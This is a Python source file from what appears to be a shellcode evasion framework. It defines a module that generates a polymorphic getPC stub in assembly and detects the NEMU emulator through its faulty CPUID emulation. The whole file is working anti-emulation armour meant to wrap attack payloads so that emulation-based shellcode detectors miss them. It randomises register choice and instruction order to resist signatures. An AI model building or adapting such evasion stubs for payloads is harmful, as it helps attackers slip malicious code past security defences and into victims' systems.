#!/usr/bin/python

"""
NEMU CPUID instruction detection
Anti-emulation armor integrating CPUID-instruction based NEMU detection
"""

from struct import unpack
from random import choice, shuffle
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, stackframepointer_registers, dest_index_regs, src_index_regs, arch_registers, bit_packs

class evasion_detect_nemu_cpuid(evasion_module):

    #
    # getPC stub incorporating NEMU detection (based on the fact that NEMU incorrectly emulates the CPUID instruction)
    #
    # [+] Features:
    #       + Lightly polymorphic (randomized register subtraction & addiction order + polymorphic getPC code)
    #
    # [*] Note:
    #       - This can be futher improved by polymorphizing both the way in which we set all GP registers to zero and the way in which we incorporate the result in the decoder stub
    #
	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]

		regs = arch_registers(self.arch, self.bits)

		call_reg = regs.random_gp_reg(False, [])

		# Generate random xor order for GP registers
		gp_regs_s = regs.get_gp_regs(False)
		shuffle(gp_regs_s)

		reg1_s = gp_regs_s[0]
		reg2_s = gp_regs_s[1]
		reg3_s = gp_regs_s[2]
		reg4_s = gp_regs_s[3]
		reg5_s = gp_regs_s[4]
		reg6_s = gp_regs_s[5]

		blacklist = [dest_index_regs[self.bits], src_index_regs[self.bits]]

		reg1_a = regs.random_gp_reg(False, blacklist)
		blacklist += [reg1_a]

		reg2_a = regs.random_gp_reg(False, blacklist)
		blacklist += [reg2_a]

		reg3_a = regs.random_gp_reg(False, blacklist)
		blacklist += [reg3_a]

		reg4_a = regs.random_gp_reg(False, blacklist)

		# null instruction
		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		# Build stack-based getPC code, store PC in getPCDestReg
		stub_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		getpc_instruction = unpack(bit_packs[self.bits], stub_builder.stack_getpc_stub(getpc_reg))[0]

		variables = {'null_instr': null_instr, 'stackpointer_reg': stackpointer_reg, 'call_reg': call_reg, 'getpc_instruction': getpc_instruction, 'reg1_s': reg1_s, 'reg2_s': reg2_s, 'reg3_s': reg3_s, 'reg4_s': reg4_s, 'reg5_s': reg5_s, 'reg6_s': reg6_s, 'reg1_a': reg1_a, 'reg2_a': reg2_a, 'reg3_a': reg3_a, 'reg4_a': reg4_a}

		listing = '''
main:
	; First XOR GP registers with eachother (all will subsequently be 0 in the case of NEMU)

	{null_instr} {reg1_s}, {reg1_s}
	{null_instr} {reg2_s}, {reg2_s}
	{null_instr} {reg3_s}, {reg3_s}
	{null_instr} {reg4_s}, {reg4_s}
	{null_instr} {reg5_s}, {reg5_s}
	{null_instr} {reg6_s}, {reg6_s}

	; CPUID
	.byte 0x0F
	.byte 0xA2

	NOT {reg1_a}
	NOT {reg2_a}
	NOT {reg3_a}
	NOT {reg4_a}

	XOR {reg1_a}, {reg2_a}
	XOR {reg1_a}, {reg3_a}
	XOR {reg1_a}, {reg4_a}

	PUSH {getpc_instruction}

	TEST {reg1_a}, {reg1_a}
	CMOVNZ {call_reg}, {stackpointer_reg}
	CALL {call_reg}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub